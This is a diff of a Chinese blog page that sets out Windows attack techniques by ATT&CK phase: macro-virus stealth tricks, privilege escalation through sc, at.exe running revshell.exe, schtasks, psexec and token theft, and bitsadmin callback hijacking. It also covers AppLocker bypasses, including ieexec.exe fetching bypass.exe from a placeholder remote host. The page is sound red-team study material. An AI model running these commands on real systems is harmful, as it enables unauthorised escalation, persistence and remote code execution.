@@ -31,10 +31,10 @@
 <meta property="og:description" content="本文基于ATT&amp;CK框架，研究Windows环境下攻击技战术...">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-05-03T14:34:14.000Z">
-<meta property="article:modified_time" content="2022-09-25T10:11:16.675Z">
+<meta property="article:modified_time" content="2022-09-25T15:11:27.235Z">
 <meta property="article:author" content="L0n9w4y">
-<meta property="article:tag" content="Windows">
 <meta property="article:tag" content="ATT&amp;CK">
+<meta property="article:tag" content="Windows">
 <meta name="twitter:card" content="summary">
 
 
@@ -121,7 +121,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-ATT-amp-CK"><span class="nav-text">0x00 ATT&amp;CK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-Initial-Access"><span class="nav-text">0x01 初始访问(Initial Access)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%92%93%E9%B1%BC"><span class="nav-text">1. 钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="nav-text">2. 水坑攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">3. 公开漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. 外部远程服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-text">5. 供应链攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E5%90%88%E6%B3%95%E5%B8%90%E5%8F%B7"><span class="nav-text">6. 利用合法帐号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB"><span class="nav-text">7. 近源攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%8A%95%E9%80%92%E6%89%A7%E8%A1%8C-Execution"><span class="nav-text">0x02 投递执行(Execution)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%8C%81%E4%B9%85%E5%8C%96-Persistence"><span class="nav-text">0x03 持久化(Persistence)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="nav-text">0x04 权限提升(Privilege Escalation)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF-Defense-Evasion"><span class="nav-text">0x05 防御规避(Defense Evasion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE-Credential-Access"><span class="nav-text">0x06 凭证访问(Credential Access)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%8E%AF%E5%A2%83%E5%8F%91%E7%8E%B0-Discovery"><span class="nav-text">0x07 环境发现(Discovery)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-Lateral-Movement"><span class="nav-text">0x08 横向移动(Lateral Movement)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86-Collection"><span class="nav-text">0x09 数据收集(Collection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6-Command-and-Control"><span class="nav-text">0x0A 命令与控制(Command and Control)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F-Exfiltration"><span class="nav-text">0x0B 数据渗漏(Exfiltration)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-%E5%BD%B1%E5%93%8D%E7%A0%B4%E5%9D%8F-Impact"><span class="nav-text">0x0C 影响破坏(Impact)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-ATT-amp-CK"><span class="nav-text">0x00 ATT&amp;CK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-Initial-Access"><span class="nav-text">0x01 初始访问(Initial Access)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%92%93%E9%B1%BC"><span class="nav-text">1. 钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="nav-text">2. 水坑攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">3. 公开漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. 外部远程服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-text">5. 供应链攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E5%90%88%E6%B3%95%E5%B8%90%E5%8F%B7"><span class="nav-text">6. 利用合法帐号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB"><span class="nav-text">7. 近源攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%8A%95%E9%80%92%E6%89%A7%E8%A1%8C-Execution"><span class="nav-text">0x02 投递执行(Execution)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%8C%81%E4%B9%85%E5%8C%96-Persistence"><span class="nav-text">0x03 持久化(Persistence)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="nav-text">0x04 权限提升(Privilege Escalation)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87%E6%9C%8D%E5%8A%A1%E5%88%9B%E5%BB%BA%E6%8F%90%E6%9D%83"><span class="nav-text">1. 通过服务创建提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8bitadmins%E5%90%AF%E5%8A%A8system%E6%9D%83%E9%99%90%E6%96%B0%E8%BF%9B%E7%A8%8B"><span class="nav-text">2. 利用bitadmins启动system权限新进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87AppLocker%E9%99%90%E5%88%B6"><span class="nav-text">3. 绕过AppLocker限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">4. 利用组策略提升权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-UAC%E6%8F%90%E6%9D%83"><span class="nav-text">5. UAC提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8Bash%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="nav-text">6. 利用Bash环境变量植入后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Token-x2F-Hash%E7%AA%83%E5%8F%96%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text">7. Token&#x2F;Hash窃取与提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-HASH-Dump"><span class="nav-text">8. HASH Dump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF-Defense-Evasion"><span class="nav-text">0x05 防御规避(Defense Evasion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE-Credential-Access"><span class="nav-text">0x06 凭证访问(Credential Access)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E7%8E%AF%E5%A2%83%E5%8F%91%E7%8E%B0-Discovery"><span class="nav-text">0x07 环境发现(Discovery)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-Lateral-Movement"><span class="nav-text">0x08 横向移动(Lateral Movement)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86-Collection"><span class="nav-text">0x09 数据收集(Collection)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6-Command-and-Control"><span class="nav-text">0x0A 命令与控制(Command and Control)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F-Exfiltration"><span class="nav-text">0x0B 数据渗漏(Exfiltration)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0C-%E5%BD%B1%E5%93%8D%E7%A0%B4%E5%9D%8F-Impact"><span class="nav-text">0x0C 影响破坏(Impact)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -337,7 +337,53 @@
 </tr>
 </tbody></table>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://attack.mitre.org/matrices/enterprise/">https://attack.mitre.org/matrices/enterprise/</a></p>
-<h2 id="0x01-初始访问-Initial-Access"><a href="#0x01-初始访问-Initial-Access" class="headerlink" title="0x01 初始访问(Initial Access)"></a>0x01 初始访问(Initial Access)</h2><h3 id="1-钓鱼"><a href="#1-钓鱼" class="headerlink" title="1. 钓鱼"></a>1. 钓鱼</h3><p>宏病毒，简单来说就是指包含了宏代码（VBA、JS）的文档。打开一个包含宏代码的.doc文档，默认发现弹出了“安全警告”，文本中内容提示用户要点击“启用内容”才能看到文件内容，用户单击“启用内容”就会运行宏，并感染病毒</p>
+<h2 id="0x01-初始访问-Initial-Access"><a href="#0x01-初始访问-Initial-Access" class="headerlink" title="0x01 初始访问(Initial Access)"></a>0x01 初始访问(Initial Access)</h2><h3 id="1-钓鱼"><a href="#1-钓鱼" class="headerlink" title="1. 钓鱼"></a>1. 钓鱼</h3><p><strong>宏病毒</strong></p>
+<p>宏病毒，简单来说就是指包含了宏代码（VBA、JS）的文档。打开一个包含宏代码的.doc文档，默认发现弹出了“安全警告”，文本中内容提示用户要点击“启用内容”才能看到文件内容，用户单击“启用内容”就会运行宏，并感染病毒</p>
+<p>宏代码以stream流的形式保存在word等文档文件中，这是微软提出的一种OLE文件（复合文件二进制格式）形式，允许不同的组件复合在同一个office文档中</p>
+<p>需要使用二进制流的方式从文档中提取宏代码，基本原理如下：</p>
+<pre class="language-none"><code class="language-none">- VBA的源码是使用olevba从MS Office中提取出来
+- 代码是使用pyparsing定义的VBAgrammar解析的，VBA grammar来源于官方的说明文档MS-VBAL
+- 解析器将VBA代码转换成一个结构化的对象模型（python对象）</code></pre>
+
+<p>宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中的宏就会被执行</p>
+<p>宏病毒的激发机制有三种：</p>
+<pre class="language-none"><code class="language-none">1) 利用自动运行的宏
+2) 修改Word命令
+3) 利用Document对象的事件</code></pre>
+
+<p>宏病毒中常用的自动执行方法有两种：</p>
+<pre class="language-none"><code class="language-none">1) 用户执行某种操作时自动执行的宏，如Sub botton()。当用户单击文档中的按钮控件时，宏自动执行
+2) Auto自动执行，如Sub AutoOpen()和Sub AutoClose()，分别在文档打开和关闭时自动执行</code></pre>
+
+<p>宏病毒利用几行代码就可以实现隐秘，宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏： </p>
+<pre class="language-none"><code class="language-none">On Error Resume Next：如果发生错误，不弹出错误对话框
+Application.DisplayStatusBar &#x3D; False：不显示状态栏，避免显示宏的运行状态
+Options.SaveNormalPrompt &#x3D; False：修改公用模板时在后台自动保存，不给任何提示
+EnableCancelKey &#x3D; wdCancelDisabled：使不可以通过ESC键取消正在执行的宏
+Application.ScreenUpdating &#x3D; 0：不让屏幕更新，让病毒执行时不影响计算机速度
+Application.DisplayAlerts &#x3D; wdAlertsNone：不让Excel弹出报警信息
+CommandBars(“Tools”).Controls(“Macro”).Enabled &#x3D; 0：屏蔽工具菜单中的“宏”按钮
+CommandBars(“Macro”).Controls(“Security”).Enabled &#x3D; 0：屏蔽宏菜单的“安全性”
+CommandBars(“Macro”).Controls(“Macros”).Enabled &#x3D; 0：屏蔽宏菜单的“宏”
+CommandBars(“Tools”).Controls(“Customize”).Enabled &#x3D; 0：屏蔽工具菜单的“自定义”
+CommandBars(“View”).Controls(“Toolbars”).Enabled &#x3D; 0：屏蔽视图宏菜单的“工具栏”
+CommandBars(“format”).Controls(“Object”).Enabled &#x3D; 0：屏蔽格式菜单的“对象”</code></pre>
+
+<p>宏病毒的强大主要来自与对Windows API和外部例程的调用:</p>
+<pre class="language-none"><code class="language-none">MSXML2.ServerXMLHTTP：Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求
+Net.WebClient：提供网络服务
+Adodb.Stream：Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序
+Wscript.shell：WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量
+Poweshell：PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境
+Application.Run：调用该函数，可以运行.exe文件
+WMI：用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:\\.\root\CIMV2隐藏启动进程
+Shell.Application：能够执行sehll命令</code></pre>
+
+<p><em>refer:</em></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/bkAK">https://www.4hou.com/posts/bkAK</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/166532.html">https://www.freebuf.com/column/166532.html</a></li>
+</ul>
 <h3 id="2-水坑攻击"><a href="#2-水坑攻击" class="headerlink" title="2. 水坑攻击"></a>2. 水坑攻击</h3><p>分析并了解目标的上网活动规律，寻找目标经常访问的网站的漏洞，利用漏洞在该网站植入恶意代码（陷阱、水坑），在目标进行访问时，攻击形成。</p>
 <p>多种可能被植入的代码，包括：</p>
 <pre class="language-none"><code class="language-none">1. 通过注入某些形式的恶意代码。例如：JavaScript、iframe、跨站脚本等
@@ -367,11 +413,303 @@
 <p>帐户访问、凭据和跨系统网络的权限的重叠是值得关注的，因为攻击者可能能够跨帐户和系统进行切换，以达到较高的访问级别(即，以绕过在企业内设置的访问控制</p>
 <h3 id="7-近源攻击"><a href="#7-近源攻击" class="headerlink" title="7. 近源攻击"></a>7. 近源攻击</h3><p>通过利用近距离通讯来进行攻击。利用目标存在的近距离通讯，例如WIFI，WiFi 安全标标准中常用的加密算法如 WEP、WPA&#x2F;WPA2、<br>WPA-PSK&#x2F;WPA2-PSK 等都存在问题，易被窃听，且容易泄露用户系统信息和 PSK 等重要安全信息，认证机制相对简单，易被各种方式主动攻击，得益与这些弱点，WIFI 攻击变得容易。对近距离通讯进行中继攻击。</p>
 <p>攻击方式：WIFI、蓝牙、ZigBee、NFC、RFID 等</p>
-<h2 id="0x02-投递执行-Execution"><a href="#0x02-投递执行-Execution" class="headerlink" title="0x02 投递执行(Execution)"></a>0x02 投递执行(Execution)</h2><h2 id="0x03-持久化-Persistence"><a href="#0x03-持久化-Persistence" class="headerlink" title="0x03 持久化(Persistence)"></a>0x03 持久化(Persistence)</h2><h2 id="0x04-权限提升-Privilege-Escalation"><a href="#0x04-权限提升-Privilege-Escalation" class="headerlink" title="0x04 权限提升(Privilege Escalation)"></a>0x04 权限提升(Privilege Escalation)</h2><h2 id="0x05-防御规避-Defense-Evasion"><a href="#0x05-防御规避-Defense-Evasion" class="headerlink" title="0x05 防御规避(Defense Evasion)"></a>0x05 防御规避(Defense Evasion)</h2><h2 id="0x06-凭证访问-Credential-Access"><a href="#0x06-凭证访问-Credential-Access" class="headerlink" title="0x06 凭证访问(Credential Access)"></a>0x06 凭证访问(Credential Access)</h2><h2 id="0x07-环境发现-Discovery"><a href="#0x07-环境发现-Discovery" class="headerlink" title="0x07 环境发现(Discovery)"></a>0x07 环境发现(Discovery)</h2><h2 id="0x08-横向移动-Lateral-Movement"><a href="#0x08-横向移动-Lateral-Movement" class="headerlink" title="0x08 横向移动(Lateral Movement)"></a>0x08 横向移动(Lateral Movement)</h2><h2 id="0x09-数据收集-Collection"><a href="#0x09-数据收集-Collection" class="headerlink" title="0x09 数据收集(Collection)"></a>0x09 数据收集(Collection)</h2><h2 id="0x0A-命令与控制-Command-and-Control"><a href="#0x0A-命令与控制-Command-and-Control" class="headerlink" title="0x0A 命令与控制(Command and Control)"></a>0x0A 命令与控制(Command and Control)</h2><h2 id="0x0B-数据渗漏-Exfiltration"><a href="#0x0B-数据渗漏-Exfiltration" class="headerlink" title="0x0B 数据渗漏(Exfiltration)"></a>0x0B 数据渗漏(Exfiltration)</h2><h2 id="0x0C-影响破坏-Impact"><a href="#0x0C-影响破坏-Impact" class="headerlink" title="0x0C 影响破坏(Impact)"></a>0x0C 影响破坏(Impact)</h2><h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
+<h2 id="0x02-投递执行-Execution"><a href="#0x02-投递执行-Execution" class="headerlink" title="0x02 投递执行(Execution)"></a>0x02 投递执行(Execution)</h2><h2 id="0x03-持久化-Persistence"><a href="#0x03-持久化-Persistence" class="headerlink" title="0x03 持久化(Persistence)"></a>0x03 持久化(Persistence)</h2><h2 id="0x04-权限提升-Privilege-Escalation"><a href="#0x04-权限提升-Privilege-Escalation" class="headerlink" title="0x04 权限提升(Privilege Escalation)"></a>0x04 权限提升(Privilege Escalation)</h2><h3 id="1-通过服务创建提权"><a href="#1-通过服务创建提权" class="headerlink" title="1. 通过服务创建提权"></a>1. 通过服务创建提权</h3><p>介绍几种从admin权限提权到system权限的方法，本质上是采用了“劫持启动”的思想，通过创建一个系统任务，劫持系统以一个system权限来执行任意的目的</p>
+<p><strong>1）使用sc命令</strong></p>
+<pre class="language-none"><code class="language-none">sc Create TestService1 binPath&#x3D; &quot;cmd &#x2F;c start&quot; type&#x3D; own type&#x3D; interact
+sc start TestService1</code></pre>
+
+<p>创建服务后，启动该服务，会遇到报错，点击“查看消息”可以得到另一个类似screen的会话界面中，获得system权限</p>
+<p>注意：通过sc创建服务必须要有administrator权限，普通账户（非administrators组）无法创建服务</p>
+<p><strong>2）通过计划任务（at.exe、schtasks.exe）</strong></p>
+<p>使用at命令（默认以system权限启动）：</p>
+<pre class="language-none"><code class="language-none"># Create a recurring task to execute every day at a specific time.
+C:\Windows\System32\at.exe at 10:00 &#x2F;interactive &#x2F;every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe</code></pre>
+
+<p>at启动的任务默认是非交互模式，如果希望以交互模式启动新进程和指令，创建服务，以system权限启动：</p>
+<pre class="language-none"><code class="language-none">schtasks &#x2F;Create &#x2F;TN TestService2 &#x2F;SC DAILY &#x2F;ST 00:36 &#x2F;TR notepad.exe &#x2F;RU SYSTEM可以使用schtasks命令</code></pre>
+
+<p>查看服务状态：</p>
+<pre class="language-none"><code class="language-none">schtasks &#x2F;Query &#x2F;TN TestService2</code></pre>
+
+<p>删除服务：</p>
+<pre class="language-none"><code class="language-none">schtasks &#x2F;Delete &#x2F;TN TestService2 &#x2F;F</code></pre>
+
+<p><strong>3）利用psexec</strong></p>
+<p>psexec.exe可以被用来向远程服务器执行程序和指令，也可以被用在本地执行进程指令</p>
+<pre class="language-none"><code class="language-none">psexec.exe -accepteula -s -i -d notepad.exe
+
+-s    Run the remote process in the System account. 
+-i    Run the program so that it interacts with the desktop of the specified session on the remote system. If no session is specified the process runs in the console session.
+-d    Don&#39;t wait for process to terminate (non-interactive).</code></pre>
+
+<p>注意：使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652，所以需要administrator权限启动</p>
+<p><strong>4）利用win32 API创建服务</strong></p>
+<p>利用新建服务的进程权限都是system这一优势获得一个system的shell</p>
+<pre class="language-none"><code class="language-none">1. 新建一个services stup exe，实现windows service的基本接口，在start逻辑里负责向named pipe中随意写入一些bytes，目的是激活named pipe
+2. 真正的提权exe，要负责创建一个named pipe，同时连接上去，和services stup exe互通
+3. 通过ImpersonateNamedPipeClient、DuplicateTokenEx从services stup exe拷贝出system token
+4. 调用CreateProcessAsUser基于已获得的token创建一个新cmd.exe shell进程，进行本地提权</code></pre>
+
+<p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/xpn/getsystem-offline">https://github.com/xpn/getsystem-offline</a></p>
+<h3 id="2-利用bitadmins启动system权限新进程"><a href="#2-利用bitadmins启动system权限新进程" class="headerlink" title="2. 利用bitadmins启动system权限新进程"></a>2. 利用bitadmins启动system权限新进程</h3><p>bitadmins是用于文件下载的windows系统内置指令，但同时它还具有另一个方便的能力就是：“下载完毕后触发一次执行执行回调，并且是system权限”</p>
+<p><strong>1) 借助bitadmins回调执行功能启动新进程，跳过文件下载环节</strong></p>
+<p>bitadmins只有在文件下载成功后，才能接着执行其中的cmd命令，但是为了缩短执行命令的时间，减小下载文件的流量，可以把文件设置为本地文件，这样就可以跳过文件下载的环节，直接执行一个指令</p>
+<pre class="language-none"><code class="language-none">bitsadmin &#x2F;create backdoor
+bitsadmin &#x2F;addfile backdoor %comspec%  %temp%\cmd.exe
+bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor &quot;%COMSPEC%&quot; &quot;cmd.exe &#x2F;c regedit.exe&quot; 
+bitsadmin &#x2F;Resume backdoor</code></pre>
+
+<p><strong>2) 劫持其他应用的bitadmins任务，向其GetNotifyCmdLine中植入恶意代码</strong></p>
+<p>bitadmins是系统updates底层使用的下载支持服务，除此之外，像chrome这种应用也会使用bitadmins进行应用更新，因此，可以通过劫持这些应用的回调GetNotifyCmdLine，向其中注入定制的代码，这样，每当应用进行升级或升级检查的时候，就会触发evil code</p>
+<pre class="language-none"><code class="language-none"> 查看现在都有哪些应用创建了bisadmins任务
+bitsadmin &#x2F;list &#x2F;allusers &#x2F;verbose
+
+bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;
+# 发现回调任务为空
+# the notification command line is &#39;NULL&#39; &#39;NULL&#39;
+# 给任务添加GetNotifyCmdLine
+bitsadmin.exe &#x2F;SetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125; &quot;%COMSPEC%&quot; &quot;cmd.exe &#x2F;c calc.exe&quot; 
+ 
+# 查看GUID
+bitsadmin &#x2F;GetNotifyCmdLine &#123;B4FF6F6E-E980-4F33-9AB6-A510E1F03044&#125;</code></pre>
+
+<p><em>refer:</em></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</a></li>
+</ul>
+<h3 id="3-绕过AppLocker限制"><a href="#3-绕过AppLocker限制" class="headerlink" title="3. 绕过AppLocker限制"></a>3. 绕过AppLocker限制</h3><p>AppLocker本质是一个“黑&#x2F;白名单机制框架”，相比黑名单，白名单是它的主流用法，AppLocker 为管理员提供指定哪些用户可以运行特定应用程序的能力。AppLocker 允许管理员控制下列类型的应用程序：</p>
+<pre class="language-none"><code class="language-none">1) 可执行文件
+.exe
+.com
+
+2) 脚本文件
+.js
+.ps1
+.vbs
+.cmd
+.bat
+
+3) Windows Installer 文件
+.msi
+.msp
+
+4) DLL 文件
+.dll
+.ocx</code></pre>
+
+<p><strong>AppLocker局限性</strong></p>
+<pre class="language-none"><code class="language-none">1) AppLocker无法控制内存中正在运行的进程：利用一些可信的进程或使用反射注入技术就可以做到绕过
+
+2) DLL劫持: 除非有严格的DLL AppLocker规则，否则你就可以DLL劫持信任的应用程序
+
+3) 不能控制Office宏
+
+4) 不能控制HTML应用程序(.hta应用)
+
+5) 白名单控制粒度过大导致绕过
+
+例如配置了只允许C:&#x2F;Windows&#x2F;目录下的进程执行，但是黑客有可能有权限向这个目录下写入自己的恶意程序，从而绕过AppLocker限制启动新进程。可以用这个脚本来探测C:\Windows\*下可写目录的可执行情况
+
+6) AppLocker是针对非管理员账户的应用程序实行限制的
+
+如果有本地管理员权限，你可以添加一个本地规则允许所有的东西都可以执行。这就会重写所有基于域的策略
+
+7) 利用系统原生白名单进程
+
+通过rundll32调用javascript代码并执行任意代码
+
+通过regsvc32.exe执行sct代码</code></pre>
+
+<p><strong>绕过Applocker方式</strong></p>
+<pre class="language-none"><code class="language-none">1）Placing files in writeable paths
+
+C:\Windows\Tasks 
+C:\Windows\Temp 
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+
+2) DXCap.exe 
+
+DXCap.exe -c C:\Windows\System32\notepad.exe
+
+3) Register-cimprovider.exe
+
+Register-cimprovider -path &quot;C:\bypass\evil.dll&quot;
+
+4) Fsi.exe
+
+fsi.exe c:\folder\d.fscript
+# Use fsi.exe to run unsigned F# code.
+
+5) msconfig
+
+msconfig即系统配置实用程序，是Microsoft System Configuration的缩写。
+
+在“C:\Windows\System32\mscfgtlc.xml”新建xml文件，
+
+    &lt;?xml  version&#x3D;&quot;1.0&quot; ?&gt;
+    &lt;MSCONFIGTOOLS&gt;
+    &lt;a NAME&#x3D;&quot;LOLBin&quot; PATH&#x3D;&quot;%windir%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;
+    DEFAULT_OPT&#x3D;&quot;-command calc.exe &quot; 
+    HELP&#x3D;&quot;LOLBin MSCONFIGTOOLS&quot;&#x2F;&gt;
+    &lt;&#x2F;MSCONFIGTOOLS&gt;
+
+启动CMD ：msconfig -5
+
+找到LOLBin一栏 点击启动 触发条件
+
+6) rundll32.exe
+
+7) InfDefaultInstall
+
+8）Ieexec.exe
+
+IEExec.exe应用程序是一个未记录的Microsoft.NET框架应用程序，它包含在.NET框架中。攻击者可以使用IEExec.exe应用程序作为主机来运行其他托管应用程序
+
+ieexec.exe http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;bypass.exe</code></pre>
+
+<h3 id="4-利用组策略提升权限"><a href="#4-利用组策略提升权限" class="headerlink" title="4. 利用组策略提升权限"></a>4. 利用组策略提升权限</h3><p><strong>开启AlwaysInstallElevated特权安装功能</strong></p>
+<p>开启AlwaysInstallElevated特权安装功能：</p>
+<ul>
+<li><p>打开组策略编辑器</p>
+</li>
+<li><p>用户配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装： 选择启用</p>
+</li>
+<li><p>计算机配置-管理模板-Windows 组件-Windows Installer-永远以高特权进行安装： 选择启用</p>
+</li>
+</ul>
+<p>此时会在注册表如下位置自动创建键值：</p>
+<pre class="language-none"><code class="language-none">[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”&#x3D;dword:00000001</code></pre>
+
+<p>如果获得了对注册表的访问权限，可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限</p>
+<pre class="language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
+
